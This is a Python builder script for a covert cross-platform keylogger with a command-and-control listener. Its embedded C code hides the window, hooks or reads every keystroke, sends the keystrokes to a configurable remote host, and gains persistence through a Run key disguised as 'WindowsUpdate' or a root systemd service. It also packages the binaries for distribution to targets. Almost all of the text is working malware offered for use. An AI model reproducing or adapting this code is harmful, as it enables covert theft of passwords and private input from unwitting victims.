#!/usr/bin/env python3
import os
import sys
import subprocess
import platform
import shutil
import time
import requests
import socket
import threading
from pathlib import Path

# Configuration
C2_HOST = "your-vps-ip.com"  # CHANGE THIS TO YOUR VPS IP
C2_PORT = 4444
CLIENT_PORT = 4444

class RemoteKeyboardDeployer:
    def __init__(self):
        self.system = platform.system().lower()
        self.is_target = False
        self.c2_running = False
        
    def update_config(self, host):
        """Update C2_HOST in C source files"""
        global C2_HOST
        C2_HOST = host
        
    def save_c_files(self):
        """Save all C source files"""
        files = {
            'client.c': self.client_c_code(),
            'server_win.c': self.server_win_c_code(),
            'server_linux.c': self.server_linux_c_code()
        }
        
        for name, content in files.items():
            with open(name, 'w') as f:
                f.write(content.format(C2_HOST=C2_HOST, C2_PORT=C2_PORT))
        print("[+] C source files saved")

    def client_c_code(self):
        return '''#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <arpa/inet.h>

#define PORT {C2_PORT}
#define BUF_SIZE 1

void *handle_client(void *arg) {{
    int client_sock = *(int*)arg;
    char buf[BUF_SIZE + 1];
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);
    getpeername(client_sock, (struct sockaddr*)&addr, &len);
    
    printf("[+] Target connected: %%s:%%d\\n", inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));
    
    while (1) {{
        int bytes = recv(client_sock, buf, BUF_SIZE, 0);
        if (bytes <= 0) break;
        buf[bytes] = 0;
        printf("%%s", buf);
        fflush(stdout);
    }}
    printf("\\n[-] Target %%s disconnected\\n", inet_ntoa(addr.sin_addr));
    close(client_sock);
    free(arg);
    return NULL;
}}

int main() {{
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in serv_addr = {{0}};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(PORT);
    
    bind(server_sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
    listen(server_sock, 5);
    
    printf("=== Remote Keyboard C2 ===\\n");
    printf("Listening on 0.0.0.0:%%d\\n", PORT);
    printf("Targets will auto-connect\\n\\n");
    
    while (1) {{
        int *client_sock = malloc(sizeof(int));
        *client_sock = accept(server_sock, NULL, NULL);
        
        pthread_t thread;
        pthread_create(&thread, NULL, handle_client, client_sock);
        pthread_detach(thread);
    }}
    close(server_sock);
    return 0;
}}'''
    
    def server_win_c_code(self):
        return '''#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#define C2_HOST "{C2_HOST}"
#define C2_PORT {C2_PORT}

HHOOK g_hKeyboardHook = NULL;
SOCKET g_sock = INVALID_SOCKET;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {{
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {{
        KBDLLHOOKSTRUCT* pKbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKbStruct->vkCode;
        
        BYTE keyboardState[256] = {{0}};
        GetKeyboardState(keyboardState);
        
        WCHAR buffer[2] = {{0}};
        int result = ToUnicode(vkCode, pKbStruct->scanCode, keyboardState, buffer, 2, 0);
        
        if (result > 0) {{
            char utf8[8] = {{0}};
            int len = WideCharToMultiByte(CP_UTF8, 0, buffer, 1, utf8, sizeof(utf8), NULL, NULL);
            if (g_sock != INVALID_SOCKET && len > 0) {{
                send(g_sock, utf8, len, 0);
            }}
        }}
    }}
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}}

DWORD WINAPI C2ConnectThread(LPVOID lpParam) {{
    while (1) {{
        WSADATA wsa;
        WSAStartup(MAKEWORD(2,2), &wsa);
        
        g_sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in server = {{0}};
        server.sin_family = AF_INET;
        server.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, C2_HOST, &server.sin_addr);
        
        if (connect(g_sock, (struct sockaddr*)&server, sizeof(server)) == 0) {{
            break;
        }}
        closesocket(g_sock);
        Sleep(5000);
        WSACleanup();
    }}
    return 0;
}}

void InstallPersistence() {{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {{
        
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        
        RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ, 
                      (BYTE*)path, strlen(path));
        RegCloseKey(hKey);
    }}
}}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {{
    
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    
    InstallPersistence();
    
    g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 
                                      GetModuleHandle(NULL), 0);
    
    CreateThread(NULL, 0, C2ConnectThread, NULL, 0, NULL);
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {{
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }}
    
    UnhookWindowsHookEx(g_hKeyboardHook);
    return 0;
}}'''
    
    def server_linux_c_code(self):
        return '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <linux/input.h>
#include <pthread.h>
#include <signal.h>

#define C2_HOST "{C2_HOST}"
#define C2_PORT {C2_PORT}
#define MAX_DEVS 16

int g_sock = -1;
int g_kb_fd = -1;

void *c2_connect(void *arg) {{
    while (1) {{
        g_sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in serv_addr = {{0}};
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, C2_HOST, &serv_addr.sin_addr);
        
        if (connect(g_sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {{
            break;
        }}
        close(g_sock);
        g_sock = -1;
        sleep(5);
    }}
    return NULL;
}}

int find_keyboard() {{
    char path[32];
    for (int i = 0; i < MAX_DEVS; i++) {{
        snprintf(path, sizeof(path), "/dev/input/event%%d", i);
        int fd = open(path, O_RDONLY | O_NONBLOCK);
        if (fd >= 0) {{
            char name[256];
            ioctl(fd, EVIOCGNAME(sizeof(name)), name);
            if (strstr(name, "keyboard")) {{
                close(fd);
                return open(path, O_RDONLY | O_NONBLOCK);
            }}
            close(fd);
        }}
    }}
    return -1;
}}

int main() {{
    signal(SIGINT, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    
    if (fork() > 0) exit(0);
    setsid();
    if (fork() > 0) exit(0);
    umask(0);
    chdir("/");
    
    g_kb_fd = find_keyboard();
    if (g_kb_fd < 0) return 1;
    
    pthread_t conn_thread;
    pthread_create(&conn_thread, NULL, c2_connect, NULL);
    
    struct input_event ev;
    while (1) {{
        if (read(g_kb_fd, &ev, sizeof(ev)) == sizeof(ev)) {{
            if (ev.type == EV_KEY && ev.value == 1) {{
                char ch = 0;
                if (ev.code >= 30 && ev.code <= 55) ch = 'a' + (ev.code - 30);
                else if (ev.code >= 16 && ev.code <= 25) ch = '0' + (ev.code - 16);
                else switch(ev.code) {{
                    case 57: ch = ' '; break;  // Space
                    case 28: ch = '\\n'; break; // Enter
                    case 14: ch = '\\b'; break; // Backspace
                }}
                if (ch && g_sock >= 0) send(g_sock, &ch, 1, 0);
            }}
        }}
    }}
    return 0;
}}'''

    def compile_all(self):
        """Compile C files for current platform"""
        print("[+] Compiling...")
        
        if self.system == "windows":
            try:
                subprocess.run(["gcc", "-mwindows", "-lws2_32", "-o", "server.exe", "server_win.c"], 
                             check=True, capture_output=True)
                print("[+] Windows server.exe compiled")
            except:
                print("[-] Windows compile failed. Install MinGW.")
                return False
                
        else:  # Linux/macOS
            try:
                subprocess.run(["gcc", "-o", "server", "server_linux.c", "-pthread"], 
                             check=True, capture_output=True)
                os.chmod("server", 0o6755)  # Sticky bit
                print("[+] Linux server compiled")
            except:
                print("[-] Linux compile failed. Install gcc.")
                return False
        
        # Always compile client
        try:
            subprocess.run(["gcc", "-o", "client", "-pthread", "client.c"], 
                         check=True, capture_output=True)
            print("[+] Client compiled")
        except:
            print("[-] Client compile failed.")
            return False
            
        return True

    def deploy_target(self):
        """Deploy server as background service on THIS machine"""
        self.is_target = True
        
        if self.system == "windows":
            print("[+] Windows deployment...")
            # Self-run hidden
            subprocess.Popen(["server.exe"], creationflags=0x08000000)  # DETACHED_PROCESS
            print("[+] Windows service deployed (hidden + autorun)")
            
        else:
            print("[+] Linux deployment...")
            # Daemonize
            os.system("./server &")
            print("[+] Linux daemon deployed")
            
            # Systemd service
            service_content = f'''[Unit]
Description=Keyboard Service
After=network.target

[Service]
Type=forking
ExecStart=/tmp/server
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target'''
            
            Path("/etc/systemd/system/keyboard.service").write_text(service_content)
            os.system("systemctl daemon-reload && systemctl enable keyboard.service")
            print("[+] Systemd service installed")

    def run_c2(self):
        """Run C2 client listener"""
        if self.c2_running:
            print("C2 already running")
            return
            
        def c2_thread():
            self.c2_running = True
            print(f"\n[*] Starting C2 on port {C2_PORT}...")
            os.system("./client")
            self.c2_running = False
            
        threading.Thread(target=c2_thread, daemon=True).start()

    def check_c2_status(self):
        """Check if C2 port is listening"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex(('127.0.0.1', C2_PORT))
        sock.close()
        return result == 0

    def status(self):
        """Print deployment status"""
        print("\n=== STATUS ===")
        print(f"Platform: {self.system.upper()}")
        print(f"C2 Host: {C2_HOST}:{C2_PORT}")
        print(f"Is Target: {self.is_target}")
        print(f"C2 Running: {self.check_c2_status()}")
        
        if self.system == "windows":
            result = os.system('tasklist | findstr server.exe >nul')
            print(f"Server Running: {'YES' if result == 0 else 'NO'}")
        else:
            result = os.system('pgrep -f server_linux >nul')
            print(f"Server Running: {'YES' if result == 0 else 'NO'}")

    def main_menu(self):
        print("\n=== Remote Keyboard Deployer ===")
        print("1. Setup C2 (compile + run client)")
        print("2. Deploy Target (THIS machine)")
        print("3. Full Deploy (compile all)")
        print("4. Status")
        print("5. Set C2 IP")
        print("6. Generate Package")
        print("0. Exit")
        
        choice = input("\nChoice: ").strip()
        
        if choice == "1":
            self.save_c_files()
            if self.compile_all():
                self.run_c2()
                
        elif choice == "2":
            self.save_c_files()
            if self.compile_all():
                self.deploy_target()
                
        elif choice == "3":
            self.save_c_files()
            self.compile_all()
            self.deploy_target()
            time.sleep(2)
            self.run_c2()
            
        elif choice == "4":
            self.status()
            
        elif choice == "5":
            host = input("C2 IP: ").strip()
            self.update_config(host)
            print(f"[+] C2 set to {host}")
            
        elif choice == "6":
            self.generate_package()
            
        elif choice == "0":
            sys.exit(0)

    def generate_package(self):
        """Create deployable package"""
        self.save_c_files()
        self.compile_all()
        
        package = "remote_keyboard_package"
        os.makedirs(package, exist_ok=True)
        
        shutil.copy("client", f"{package}/")
        shutil.copy("server.exe" if self.system == "windows" else "server", f"{package}/")
        
        with open(f"{package}/README.txt", "w") as f:
            f.write(f"""Remote Keyboard Package
C2: {C2_HOST}:{C2_PORT}

Windows: Double-click server.exe (runs hidden)
Linux:   chmod +x server && ./server

C2: ./client""")
        
        shutil.make_archive(package, 'zip', package)
        print(f"[+] Package created: {package}.zip")

if __name__ == "__main__":
    deployer = RemoteKeyboardDeployer()
    
    if len(sys.argv) > 1:
        if sys.argv[1] == "c2":
            deployer.save_c_files()
            deployer.compile_all()
            deployer.run_c2()
        elif sys.argv[1] == "target":
            deployer.save_c_files()
            deployer.compile_all()
            deployer.deploy_target()
        elif sys.argv[1] == "full":
            deployer.save_c_files()
            deployer.compile_all()
            deployer.deploy_target()
            deployer.run_c2()
    else:
        deployer.main_menu()
